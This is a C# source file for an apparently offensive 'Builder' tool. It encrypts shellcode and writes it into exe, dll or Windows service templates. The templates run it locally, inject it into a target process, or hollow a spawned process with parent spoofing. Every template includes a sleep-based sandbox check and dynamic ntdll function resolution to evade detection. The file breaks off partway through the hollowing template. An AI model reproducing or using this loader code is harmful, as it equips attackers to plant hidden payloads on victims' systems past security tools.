using System;
using System.Linq;
using System.Text;
using System.IO;
using System.Security.Cryptography;
using System.Globalization;
using System.Runtime.InteropServices;

namespace Builder
{
    class Program
    {
        [DllImport("kernel32.dll")] static extern void Sleep(uint dwMilliseconds);
        public static byte[] encrypted;
        public static StringBuilder eshellcode;
        public static string outputfile;
        public static string buildfile;
        public static string template;
        public static string Imports;
        public static string Mainfunc;
        public static string Decryptfunc;
        public static string Classes;
        public static string MyKey;
        public static string Myiv;
        public static string parseshellcode;
        public static string formattedencryptedshellcode;
        public static string outputproduct;
        static void Main(string[] args)
        {
            if (args == null || args.Length == 0)
            {
                Console.WriteLine("Usage: \r\n /F: Format exe, dll, or service. \r\n /T: Technique basic, inject, or hollow \r\n /S: Shellcode file \r\n /P: Process name to Inject into or Hollow. \r\n  Injecting: explorer\r\n  Hollowing: c:\\\\windows\\\\system32\\\\svchost.exe\r\n /X: Parent Process for Hollowing\r\n  Hollowing: explorer \r\n /A: Architecture x86 or x64 \r\n");
                return;
            }
            string technique = "";
            string shellcodefile = "";
            string inject_hollow_target = "";
            string architecture = "";
            string format = "";
            string parent_process = "";
            string cd = Directory.GetCurrentDirectory();

            string[] reqargs =
            {
                "/T:",
                "/S:",
                "/A:",
                "/F:",
            };
            var argtest = args.Select(i => i.Substring(0, 2).ToUpper()).ToArray();
            foreach (string i in reqargs)
            {
                if (argtest.Contains(i.Substring(0, 2).ToUpper()) == false)
                {
                    Console.WriteLine(i + " Required!");
                    return;
                }
            }
            foreach (string arg in args)
            {
                switch (arg.Substring(0, 2).ToUpper())
                {
                    case "/T":
                        technique = arg.Substring(3);
                        break;
                    case "/S":
                        shellcodefile = arg.Substring(3);
                        break;
                    case "/P":
                        inject_hollow_target = arg.Substring(3);
                        break;
                    case "/A":
                        architecture = arg.Substring(3);
                        break;
                    case "/F":
                        format = arg.Substring(3);
                        break;
                    case "/X":
                        parent_process = arg.Substring(3);
                        break;
                    default:
                        // do other stuff...
                        break;
                }
            }
            // Create a new instance of the Aes class.  This generates a new key and initialization vector (IV).
            using (Aes myAes = Aes.Create())
            {

                if (shellcodefile.Contains(".txt"))
                {
                    //Read shellcode from file in string format
                    string fileinput = File.ReadAllText(shellcodefile);
                    //Remove "0x" chars from shellcode so 0xd3 becomes d3 and split string on , into a string array
                    string[] inputarray = fileinput.Replace("0x", string.Empty).Split(',');

                    //Convert each item into a byte and store in array eg. d3 becomes 0xd3 in byte array
                    byte[] buf = inputarray.Select(m => byte.Parse(m.ToString(), NumberStyles.HexNumber)).ToArray();
                    string bufstring = BitConverter.ToString(buf);
                    // Encrypt the shellcode and format
                    encrypted = EncryptStringToBytes_Aes(bufstring, myAes.Key, myAes.IV);
                    eshellcode = new StringBuilder(encrypted.Length * 2);
                    foreach (byte b in encrypted)
                    {
                        eshellcode.AppendFormat("0x{0:x2}, ", b);
                    }

                }
                else if (shellcodefile.Contains(".bin"))
                {
                    byte[] buff = File.ReadAllBytes(shellcodefile);
                    string bufstring = BitConverter.ToString(buff);
                    encrypted = EncryptStringToBytes_Aes(bufstring, myAes.Key, myAes.IV);
                    eshellcode = new StringBuilder(encrypted.Length * 2);
                    foreach (byte b in encrypted)
                    {
                        eshellcode.AppendFormat("0x{0:x2}, ", b);
                    }
                }

                //Convert AESkey and IV to strings, remove trailing characters from encrypted shellcode and format for output
                MyKey = $"string MyKey = \"{ BitConverter.ToString(myAes.Key)}\";";
                Myiv = $"string Myiv = \"{ BitConverter.ToString(myAes.IV)}\";";
                parseshellcode = eshellcode.ToString().Remove(eshellcode.ToString().Length - 2, 2);
                formattedencryptedshellcode = "byte[] buf = new byte[" + encrypted.Length + "] {" + parseshellcode + "};";

            }
            if (format == "exe")
            {
                template = cd + "\\exe\\template.cs";
                outputfile = cd + "\\exe\\Program.cs";
                buildfile = cd + "\\exe\\exe.csproj";
                outputproduct = "exe.exe";
            }
            else if (format == "dll")
            {
                template = cd + "\\dll\\template.cs";
                outputfile = cd + "\\dll\\Class1.cs";
                buildfile = cd + "\\dll\\dll.csproj";
                outputproduct = "dll.dll";
            }
            else if (format == "service")
            {
                template = cd + "\\service\\template.cs";
                outputfile = cd + "\\service\\Service1.cs";
                buildfile = cd + "\\service\\service.csproj";
                outputproduct = "service.exe";
            }
            else
            {
                Console.WriteLine("Invalid format!");
                System.Environment.Exit(0);
            }


            if (technique == "basic")
            {
                Imports = @"
        [DllImport(""kernel32.dll"", SetLastError = true)] public static extern IntPtr GetCurrentProcess();
        [DllImport(""kernel32.dll"")] static extern void Sleep(uint dwMilliseconds); ";

                Mainfunc = @"
            DateTime t1 = DateTime.Now;
            Sleep(5000);
            double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
            if (t2 < 4.5)
            {
                return;
            }
            IntPtr pointer = Invoke.GetLibraryAddress(""Ntdll.dll"", ""NtAllocateVirtualMemory"");
            DELEGATES.NtAllocateVirtualMemory NtAllocateVirtualMemory = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DELEGATES.NtAllocateVirtualMemory)) as DELEGATES.NtAllocateVirtualMemory;

            pointer = Invoke.GetLibraryAddress(""Ntdll.dll"", ""NtCreateThreadEx"");
            DELEGATES.NtCreateThreadEx NtCreateThreadEx = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DELEGATES.NtCreateThreadEx)) as DELEGATES.NtCreateThreadEx;

            pointer = Invoke.GetLibraryAddress(""Ntdll.dll"", ""NtWaitForSingleObject"");
            DELEGATES.NtWaitForSingleObject NtWaitForSingleObject = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DELEGATES.NtWaitForSingleObject)) as DELEGATES.NtWaitForSingleObject;

            pointer = Invoke.GetLibraryAddress(""Ntdll.dll"", ""NtProtectVirtualMemory"");
            DELEGATES.NtProtectVirtualMemory NtProtectVirtualMemory = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DELEGATES.NtProtectVirtualMemory)) as DELEGATES.NtProtectVirtualMemory;

            <KEY>
            <IV>
            <SHELLCODE>
            //Convert key to bytes
            string[] c1 = MyKey.Split('-');
            byte[] f = new byte[c1.Length];
            for (int i = 0; i < c1.Length; i++) f[i] = Convert.ToByte(c1[i], 16);
            //Convert IV to bytes
            string[] d1 = Myiv.Split('-');
            byte[] g = new byte[d1.Length];
            for (int i = 0; i < d1.Length; i++) g[i] = Convert.ToByte(d1[i], 16);
            string roundtrip = DecryptStringFromBytes_Aes(buf, f, g);
            // Remove dashes from string
            string[] roundnodash = roundtrip.Split('-');
            // Convert Decrypted shellcode back to bytes
            byte[] e = new byte[roundnodash.Length];
            for (int i = 0; i < roundnodash.Length; i++) e[i] = Convert.ToByte(roundnodash[i], 16);

            IntPtr hCurrentProcess = GetCurrentProcess();
            IntPtr pMemoryAllocation = new IntPtr(); // needs to be passed as ref
            IntPtr pZeroBits = IntPtr.Zero;
            IntPtr pAllocationSize = new IntPtr(Convert.ToUInt32(e.Length)); // needs to be passed as ref
            uint allocationType = 0x3000;
            uint protection = 0x00000004;
            NtAllocateVirtualMemory(hCurrentProcess, ref pMemoryAllocation, pZeroBits, ref pAllocationSize, allocationType, protection);
            Marshal.Copy(e, 0, pMemoryAllocation, e.Length);
            UInt32 oldprotect = 0;
            IntPtr bufferlength = new IntPtr(e.Length);
            NtProtectVirtualMemory.DynamicInvoke(hCurrentProcess, pMemoryAllocation, bufferlength, 0x20, oldprotect);

            IntPtr hThread = new IntPtr(0);
            STRUCTS.ACCESS_MASK desiredAccess = STRUCTS.ACCESS_MASK.SPECIFIC_RIGHTS_ALL | STRUCTS.ACCESS_MASK.STANDARD_RIGHTS_ALL; // logical OR the access rights together
            IntPtr pObjectAttributes = new IntPtr(0);
            IntPtr lpParameter = new IntPtr(0);
            bool bCreateSuspended = false;
            int stackZeroBits = 0;
            int sizeOfStackCommit = 0xFFFF;
            int sizeOfStackReserve = 0xFFFF;
            IntPtr pBytesBuffer = new IntPtr(0);

            NtCreateThreadEx(out hThread, desiredAccess, pObjectAttributes, hCurrentProcess, pMemoryAllocation, lpParameter, bCreateSuspended, stackZeroBits, sizeOfStackCommit, sizeOfStackReserve, pBytesBuffer);
            NtWaitForSingleObject(hThread, false, 0); ";

                Classes = @"
    public class DELEGATES
    {
        //standalone delegates
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate UInt32 NtProtectVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref IntPtr RegionSize, Int32 NewProtect, ref UInt32 OldProtect);
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate UInt32 NtCreateThreadEx(out IntPtr threadHandle, STRUCTS.ACCESS_MASK desiredAccess, IntPtr objectAttributes, IntPtr processHandle, IntPtr startAddress, IntPtr parameter, bool createSuspended, int stackZeroBits, int sizeOfStack, int maximumStackSize, IntPtr attributeList);
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate UInt32 NtWaitForSingleObject(IntPtr ProcessHandle, Boolean Alertable, int TimeOut);
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate UInt32 NtAllocateVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, ref IntPtr RegionSize, UInt32 AllocationType, UInt32 Protect);
    }
    public class STRUCTS
    {
        public enum ACCESS_MASK : uint
        {
            DELETE = 0x00010000,
            READ_CONTROL = 0x00020000,
            WRITE_DAC = 0x00040000,
            WRITE_OWNER = 0x00080000,
            SYNCHRONIZE = 0x00100000,
            STANDARD_RIGHTS_REQUIRED = 0x000F0000,
            STANDARD_RIGHTS_READ = 0x00020000,
            STANDARD_RIGHTS_WRITE = 0x00020000,
            STANDARD_RIGHTS_EXECUTE = 0x00020000,
            STANDARD_RIGHTS_ALL = 0x001F0000,
            SPECIFIC_RIGHTS_ALL = 0x0000FFF,
            ACCESS_SYSTEM_SECURITY = 0x01000000,
            MAXIMUM_ALLOWED = 0x02000000,
            GENERIC_READ = 0x80000000,
            GENERIC_WRITE = 0x40000000,
            GENERIC_EXECUTE = 0x20000000,
            GENERIC_ALL = 0x10000000,
            DESKTOP_READOBJECTS = 0x00000001,
            DESKTOP_CREATEWINDOW = 0x00000002,
            DESKTOP_CREATEMENU = 0x00000004,
            DESKTOP_HOOKCONTROL = 0x00000008,
            DESKTOP_JOURNALRECORD = 0x00000010,
            DESKTOP_JOURNALPLAYBACK = 0x00000020,
            DESKTOP_ENUMERATE = 0x00000040,
            DESKTOP_WRITEOBJECTS = 0x00000080,
            DESKTOP_SWITCHDESKTOP = 0x00000100,
            WINSTA_ENUMDESKTOPS = 0x00000001,
            WINSTA_READATTRIBUTES = 0x00000002,
            WINSTA_ACCESSCLIPBOARD = 0x00000004,
            WINSTA_CREATEDESKTOP = 0x00000008,
            WINSTA_WRITEATTRIBUTES = 0x00000010,
            WINSTA_ACCESSGLOBALATOMS = 0x00000020,
            WINSTA_EXITWINDOWS = 0x00000040,
            WINSTA_ENUMERATE = 0x00000100,
            WINSTA_READSCREEN = 0x00000200,
            WINSTA_ALL_ACCESS = 0x0000037F,
            SECTION_ALL_ACCESS = 0x10000000,
            SECTION_QUERY = 0x0001,
            SECTION_MAP_WRITE = 0x0002,
            SECTION_MAP_READ = 0x0004,
            SECTION_MAP_EXECUTE = 0x0008,
            SECTION_EXTEND_SIZE = 0x0010
        };
    }
    public class Invoke
    {
        public static IntPtr GetLibraryAddress(string DLLName, string FunctionName, bool CanLoadFromDisk = false, bool ResolveForwards = false)
        {
            IntPtr hModule = GetLoadedModuleAddress(DLLName);
            if (hModule == IntPtr.Zero)
            {
                throw new DllNotFoundException(DLLName + "", Dll was not found."");
            }

            return GetExportAddress(hModule, FunctionName, ResolveForwards);
        }
        public static IntPtr GetLoadedModuleAddress(string DLLName)
        {
            ProcessModuleCollection ProcModules = Process.GetCurrentProcess().Modules;
            foreach (ProcessModule Mod in ProcModules)
            {
                if (Mod.FileName.ToLower().EndsWith(DLLName.ToLower()))
                {
                    return Mod.BaseAddress;
                }
            }
            return IntPtr.Zero;
        }
        public static IntPtr GetExportAddress(IntPtr ModuleBase, string ExportName, bool ResolveForwards = false)
        {
            IntPtr FunctionPtr = IntPtr.Zero;
            try
            {
                // Traverse the PE header in memory
                Int32 PeHeader = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + 0x3C));
                Int16 OptHeaderSize = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + PeHeader + 0x14));
                Int64 OptHeader = ModuleBase.ToInt64() + PeHeader + 0x18;
                Int16 Magic = Marshal.ReadInt16((IntPtr)OptHeader);
                Int64 pExport = 0;
                if (Magic == 0x010b)
                {
                    pExport = OptHeader + 0x60;
                }
                else
                {
                    pExport = OptHeader + 0x70;
                }

                // Read -> IMAGE_EXPORT_DIRECTORY
                Int32 ExportRVA = Marshal.ReadInt32((IntPtr)pExport);
                Int32 OrdinalBase = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x10));
                Int32 NumberOfFunctions = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x14));
                Int32 NumberOfNames = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x18));
                Int32 FunctionsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x1C));
                Int32 NamesRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x20));
                Int32 OrdinalsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x24));

                // Get the VAs of the name table's beginning and end.
                Int64 NamesBegin = ModuleBase.ToInt64() + Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + NamesRVA));
                Int64 NamesFinal = NamesBegin + NumberOfNames * 4;

                // Loop the array of export name RVA's
                for (int i = 0; i < NumberOfNames; i++)
                {
                    string FunctionName = Marshal.PtrToStringAnsi((IntPtr)(ModuleBase.ToInt64() + Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + NamesRVA + i * 4))));
                    if (FunctionName.Equals(ExportName, StringComparison.OrdinalIgnoreCase))
                    {
                        Int32 FunctionOrdinal = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + OrdinalsRVA + i * 2)) + OrdinalBase;
                        Int32 FunctionRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + FunctionsRVA + (4 * (FunctionOrdinal - OrdinalBase))));
                        FunctionPtr = (IntPtr)((Int64)ModuleBase + FunctionRVA);
                        break;
                    }
                }
            }
            catch
            {
                // Catch parser failure
                throw new InvalidOperationException(""Failed to parse module exports."");
            }
            if (FunctionPtr == IntPtr.Zero)
            {
                // Export not found
                throw new MissingMethodException(ExportName + "", export not found."");
            }
            return FunctionPtr;
        }
    }";
            }
            else if (technique == "inject")
            {
                Imports = @"
        [DllImport(""kernel32.dll"")] static extern void Sleep(uint dwMilliseconds);";

                Mainfunc = @"
            DateTime t1 = DateTime.Now;
            Sleep(5000);
            double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
            if (t2 < 4.5)
            {
                return;
            }
            IntPtr pointer = Invoke.GetLibraryAddress(""Ntdll.dll"", ""NtOpenProcess"");
            DELEGATES.NtOpenProcess NtOpenProcess = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DELEGATES.NtOpenProcess)) as DELEGATES.NtOpenProcess;
            pointer = Invoke.GetLibraryAddress(""Ntdll.dll"", ""NtProtectVirtualMemory"");
            DELEGATES.NtProtectVirtualMemory NtProtectVirtualMemory = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DELEGATES.NtProtectVirtualMemory)) as DELEGATES.NtProtectVirtualMemory;
            pointer = Invoke.GetLibraryAddress(""Ntdll.dll"", ""NtAllocateVirtualMemory"");
            DELEGATES.NtAllocateVirtualMemory NtAllocateVirtualMemory = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DELEGATES.NtAllocateVirtualMemory)) as DELEGATES.NtAllocateVirtualMemory;
            pointer = Invoke.GetLibraryAddress(""Ntdll.dll"", ""NtWriteVirtualMemory"");
            DELEGATES.NtWriteVirtualMemory NtWriteVirtualMemory = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DELEGATES.NtWriteVirtualMemory)) as DELEGATES.NtWriteVirtualMemory;
            pointer = Invoke.GetLibraryAddress(""Ntdll.dll"", ""RtlCreateUserThread"");
            DELEGATES.RtlCreateUserThread RtlCreateUserThread = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DELEGATES.RtlCreateUserThread)) as DELEGATES.RtlCreateUserThread;

            <KEY>
            <IV>
            <SHELLCODE>
            string[] c1 = MyKey.Split('-');
            byte[] f = new byte[c1.Length];
            for (int i = 0; i < c1.Length; i++) f[i] = Convert.ToByte(c1[i], 16);
            string[] d1 = Myiv.Split('-');
            byte[] g = new byte[d1.Length];
            for (int i = 0; i < d1.Length; i++) g[i] = Convert.ToByte(d1[i], 16);
            string roundtrip = DecryptStringFromBytes_Aes(buf, f, g);
            string[] roundnodash = roundtrip.Split('-');
            byte[] e = new byte[roundnodash.Length];
            for (int i = 0; i < roundnodash.Length; i++) e[i] = Convert.ToByte(roundnodash[i], 16);

            Process[] localByName = Process.GetProcessesByName(""<PROCESS>"");
            IntPtr ProcessHandle = IntPtr.Zero;
            STRUCTS.OBJECT_ATTRIBUTES oa = new STRUCTS.OBJECT_ATTRIBUTES();
            STRUCTS.CLIENT_ID ci = new STRUCTS.CLIENT_ID();
            ci.UniqueProcess = (IntPtr)localByName[0].Id;
            NtOpenProcess(ref ProcessHandle, STRUCTS.ProcessAccessFlags.PROCESS_ALL_ACCESS, ref oa, ref ci);
            IntPtr pMemoryAllocation = new IntPtr(); // needs to be passed as ref
            IntPtr pZeroBits = IntPtr.Zero;
            IntPtr pAllocationSize = new IntPtr(Convert.ToUInt32(e.Length));
            uint allocationType = 0x3000;
            uint protection = 0x00000004;
            NtAllocateVirtualMemory(ProcessHandle, ref pMemoryAllocation, pZeroBits, ref pAllocationSize, allocationType, protection);
            UInt32 nread = 0;
            NtWriteVirtualMemory.DynamicInvoke(ProcessHandle, pMemoryAllocation, e, (UInt32)e.Length, nread);
            UInt32 oldprotect = 0;
            IntPtr bufferlength = new IntPtr(e.Length);
            NtProtectVirtualMemory.DynamicInvoke(ProcessHandle, pMemoryAllocation, bufferlength, 0x20, oldprotect);

            IntPtr thread = IntPtr.Zero;
            RtlCreateUserThread(ProcessHandle, IntPtr.Zero, false, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, pMemoryAllocation, IntPtr.Zero, ref thread, IntPtr.Zero); ";

                Classes = @"
    public class DELEGATES
        {
            //injection delegates
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate UInt32 NtProtectVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref IntPtr RegionSize, Int32 NewProtect, ref UInt32 OldProtect);
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate UInt32 NtOpenProcess(ref IntPtr ProcessHandle, STRUCTS.ProcessAccessFlags DesiredAccess, ref STRUCTS.OBJECT_ATTRIBUTES ObjectAttributes, ref STRUCTS.CLIENT_ID ClientId);
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate UInt32 RtlCreateUserThread(IntPtr Process, IntPtr ThreadSecurityDescriptor, bool CreateSuspended, IntPtr ZeroBits, IntPtr MaximumStackSize, IntPtr CommittedStackSize, IntPtr StartAddress, IntPtr Parameter, ref IntPtr Thread, IntPtr ClientId);
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate UInt32 NtWriteVirtualMemory(IntPtr ProcessHandle, IntPtr BaseAddress, Byte[] Buffer, UInt32 BufferLength, ref UInt32 BytesWritten);
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate UInt32 NtAllocateVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, ref IntPtr RegionSize, UInt32 AllocationType, UInt32 Protect);
        }
    public class STRUCTS
    {
        [Flags]
        public enum ProcessAccessFlags : UInt32
        {
            PROCESS_ALL_ACCESS = 0x001F0FFF
        }
        public struct OBJECT_ATTRIBUTES
        {
            public Int32 Length;
            public IntPtr RootDirectory;
            public IntPtr ObjectName; // -> UNICODE_STRING
            public uint Attributes;
            public IntPtr SecurityDescriptor;
            public IntPtr SecurityQualityOfService;
        }
        [StructLayout(LayoutKind.Sequential)]
        public struct CLIENT_ID
        {
            public IntPtr UniqueProcess;
            public IntPtr UniqueThread;
        }
    }
    public class Invoke
    {
        public static IntPtr GetLibraryAddress(string DLLName, string FunctionName, bool CanLoadFromDisk = false, bool ResolveForwards = false)
        {
            IntPtr hModule = GetLoadedModuleAddress(DLLName);
            if (hModule == IntPtr.Zero)
            {
                throw new DllNotFoundException(DLLName + "", Dll was not found."");
            }

            return GetExportAddress(hModule, FunctionName, ResolveForwards);
        }

        public static IntPtr GetLoadedModuleAddress(string DLLName)
        {
            ProcessModuleCollection ProcModules = Process.GetCurrentProcess().Modules;
            foreach (ProcessModule Mod in ProcModules)
            {
                if (Mod.FileName.ToLower().EndsWith(DLLName.ToLower()))
                {
                    return Mod.BaseAddress;
                }
            }
            return IntPtr.Zero;
        }
        public static IntPtr GetExportAddress(IntPtr ModuleBase, string ExportName, bool ResolveForwards = false)
        {
            IntPtr FunctionPtr = IntPtr.Zero;
            try
            {
                // Traverse the PE header in memory
                Int32 PeHeader = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + 0x3C));
                Int16 OptHeaderSize = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + PeHeader + 0x14));
                Int64 OptHeader = ModuleBase.ToInt64() + PeHeader + 0x18;
                Int16 Magic = Marshal.ReadInt16((IntPtr)OptHeader);
                Int64 pExport = 0;
                if (Magic == 0x010b)
                {
                    pExport = OptHeader + 0x60;
                }
                else
                {
                    pExport = OptHeader + 0x70;
                }

                // Read -> IMAGE_EXPORT_DIRECTORY
                Int32 ExportRVA = Marshal.ReadInt32((IntPtr)pExport);
                Int32 OrdinalBase = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x10));
                Int32 NumberOfFunctions = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x14));
                Int32 NumberOfNames = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x18));
                Int32 FunctionsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x1C));
                Int32 NamesRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x20));
                Int32 OrdinalsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x24));

                // Get the VAs of the name table's beginning and end.
                Int64 NamesBegin = ModuleBase.ToInt64() + Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + NamesRVA));
                Int64 NamesFinal = NamesBegin + NumberOfNames * 4;

                // Loop the array of export name RVA's
                for (int i = 0; i < NumberOfNames; i++)
                {
                    string FunctionName = Marshal.PtrToStringAnsi((IntPtr)(ModuleBase.ToInt64() + Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + NamesRVA + i * 4))));
                    if (FunctionName.Equals(ExportName, StringComparison.OrdinalIgnoreCase))
                    {
                        Int32 FunctionOrdinal = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + OrdinalsRVA + i * 2)) + OrdinalBase;
                        Int32 FunctionRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + FunctionsRVA + (4 * (FunctionOrdinal - OrdinalBase))));
                        FunctionPtr = (IntPtr)((Int64)ModuleBase + FunctionRVA);
                        break;
                    }
                }
            }
            catch
            {
                // Catch parser failure
                throw new InvalidOperationException(""Failed to parse module exports."");
            }

            if (FunctionPtr == IntPtr.Zero)
            {
                // Export not found
                throw new MissingMethodException(ExportName + "", export not found."");
            }
            return FunctionPtr;
        }
    }";

            }
            else if (technique == "hollow")
            {
                Imports = @"
        [DllImport(""kernel32.dll"")] static extern void Sleep(uint dwMilliseconds);";

                Mainfunc = @"
            DateTime t1 = DateTime.Now;
            Sleep(5000);
            double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
            if (t2 < 4.5)
            {
                return;
            }
            bool x64;
            if (IntPtr.Size == 8)
            {
                x64 = true;
            }
            else
            {
                x64 = false;
            }
            <KEY>
            <IV>
            <SHELLCODE>
            //Convert key to bytes
            string[] c1 = MyKey.Split('-');
            byte[] f = new byte[c1.Length];
            for (int i = 0; i < c1.Length; i++) f[i] = Convert.ToByte(c1[i], 16);
            //Convert IV to bytes
            string[] d1 = Myiv.Split('-');
            byte[] g = new byte[d1.Length];
            for (int i = 0; i < d1.Length; i++) g[i] = Convert.ToByte(d1[i], 16);

            string roundtrip = DecryptStringFromBytes_Aes(buf, f, g);
            // Remove dashes from string
            string[] roundnodash = roundtrip.Split('-');
            // Convert Decrypted shellcode back to bytes
            byte[] e = new byte[roundnodash.Length];
            for (int i = 0; i < roundnodash.Length; i++) e[i] = Convert.ToByte(roundnodash[i], 16);

            IntPtr pointer = Invoke.GetLibraryAddress(""kernel32.dll"", ""CreateProcessA"");
            DELEGATES.CreateProcess CreateProcess = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DELEGATES.CreateProcess)) as DELEGATES.CreateProcess;

            pointer = Invoke.GetLibraryAddress(""kernel32.dll"", ""InitializeProcThreadAttributeList"", false, true);
            DELEGATES.InitializeProcThreadAttributeList InitializeProcThreadAttributeList = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DELEGATES.InitializeProcThreadAttributeList)) as DELEGATES.InitializeProcThreadAttributeList;

            pointer = Invoke.GetLibraryAddress(""kernel32.dll"", ""UpdateProcThreadAttribute"", false, true);
            DELEGATES.UpdateProcThreadAttribute UpdateProcThreadAttribute = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DELEGATES.UpdateProcThreadAttribute)) as DELEGATES.UpdateProcThreadAttribute;

            pointer = Invoke.GetLibraryAddress(""kernel32.dll"", ""DeleteProcThreadAttributeList"", false, true);
            DELEGATES.DeleteProcThreadAttributeList DeleteProcThreadAttributeList = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DELEGATES.DeleteProcThreadAttributeList)) as DELEGATES.DeleteProcThreadAttributeList;

            pointer = Invoke.GetLibraryAddress(""Ntdll.dll"", ""ZwQueryInformationProcess"");
            DELEGATES.ZwQueryInformationProcess ZwQueryInformationProcess = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DELEGATES.ZwQueryInformationProcess)) as DELEGATES.ZwQueryInformationProcess;

            pointer = Invoke.GetLibraryAddress(""Ntdll.dll"", ""NtReadVirtualMemory"");
            DELEGATES.NtReadVirtualMemory NtReadVirtualMemory = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DELEGATES.NtReadVirtualMemory)) as DELEGATES.NtReadVirtualMemory;

            pointer = Invoke.GetLibraryAddress(""Ntdll.dll"", ""NtProtectVirtualMemory"");
            DELEGATES.NtProtectVirtualMemory NtProtectVirtualMemory = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DELEGATES.NtProtectVirtualMemory)) as DELEGATES.NtProtectVirtualMemory;

            pointer = Invoke.GetLibraryAddress(""kernel32.dll"", ""ResumeThread"");
            DELEGATES.ResumeThread ResumeThread = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DELEGATES.ResumeThread)) as DELEGATES.ResumeThread;

            pointer = Invoke.GetLibraryAddress(""Ntdll.dll"", ""NtWriteVirtualMemory"");
            DELEGATES.NtWriteVirtualMemory NtWriteVirtualMemory = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DELEGATES.NtWriteVirtualMemory)) as DELEGATES.NtWriteVirtualMemory;


            STRUCTS.STARTUPINFOEX si = new STRUCTS.STARTUPINFOEX();
            STRUCTS.PROCESS_INFORMATION pi = new STRUCTS.PROCESS_INFORMATION();
            si.StartupInfo.cb = (uint)Marshal.SizeOf(si);
            var lpValue = Marshal.AllocHGlobal(IntPtr.Size);
            try
            {
                STRUCTS.SECURITY_ATTRIBUTES lpa = new STRUCTS.SECURITY_ATTRIBUTES();
                STRUCTS.SECURITY_ATTRIBUTES lta = new STRUCTS.SECURITY_ATTRIBUTES();
                lpa.nLength = Marshal.SizeOf(lpa);
                lta.nLength = Marshal.SizeOf(lta);

                var lpSize = IntPtr.Zero;
                InitializeProcThreadAttributeList(IntPtr.Zero, 2, 0, ref lpSize);
                si.lpAttributeList = Marshal.AllocHGlobal(lpSize);
                InitializeProcThreadAttributeList(si.lpAttributeList, 2, 0, ref lpSize);

                if (x64)
                {
                    Marshal.WriteIntPtr(lpValue, new IntPtr((long)0x300000000000)); //BinarySignaturePolicy.BLOCK_NON_MICROSOFT_BINARIES_ALLOW_STORE
                }
                else
                {
                    Marshal.WriteIntPtr(lpValue, new IntPtr(unchecked((uint)0x300000000000)));
                }

                UpdateProcThreadAttribute(si.lpAttributeList, 0, (IntPtr)STRUCTS.ProcThreadAttribute.MITIGATION_POLICY, lpValue, (IntPtr)IntPtr.Size, IntPtr.Zero, IntPtr.Zero);

                var parentHandle = Process.GetProcessesByName(""<PARENT>"")[0].Handle;
                lpValue = Marshal.AllocHGlobal(IntPtr.Size);
                Marshal.WriteIntPtr(lpValue, parentHandle);

                UpdateProcThreadAttribute(si.lpAttributeList, 0, (IntPtr)STRUCTS.ProcThreadAttribute.PARENT_PROCESS, lpValue, (IntPtr)IntPtr.Size, IntPtr.Zero, IntPtr.Zero);

